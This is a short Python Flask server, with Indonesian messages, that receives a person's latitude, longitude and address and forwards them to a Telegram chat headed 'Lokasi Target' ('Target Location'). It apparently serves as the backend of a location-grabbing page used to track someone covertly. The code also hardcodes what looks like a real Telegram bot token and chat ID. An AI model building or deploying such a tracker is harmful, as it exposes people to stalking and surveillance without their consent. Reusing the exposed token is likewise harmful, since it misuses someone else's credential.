from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

BOT_TOKEN = '7552258791:AAFOPquDIib6pBjmnq8J-Pq5__lgp6qskG4'
CHAT_ID = '-1002360934041'

@app.route('/save-location', methods=['POST'])
def save_location():
    data = request.json
    latitude = data.get('latitude')
    longitude = data.get('longitude')
    return jsonify({"message": "Lokasi berhasil disimpan", "latitude": latitude, "longitude": longitude})

@app.route('/send-telegram', methods=['POST'])
def send_telegram():
    data = request.json
    latitude = data.get('latitude')
    longitude = data.get('longitude')
    address = data.get('address', 'Alamat tidak tersedia')
    
    message = f"\ud83d\udccd Lokasi Target:\nLatitude: {latitude}\nLongitude: {longitude}\nAlamat: {address}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message}
    
    response = requests.post(url, json=payload)
    return jsonify(response.json())

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
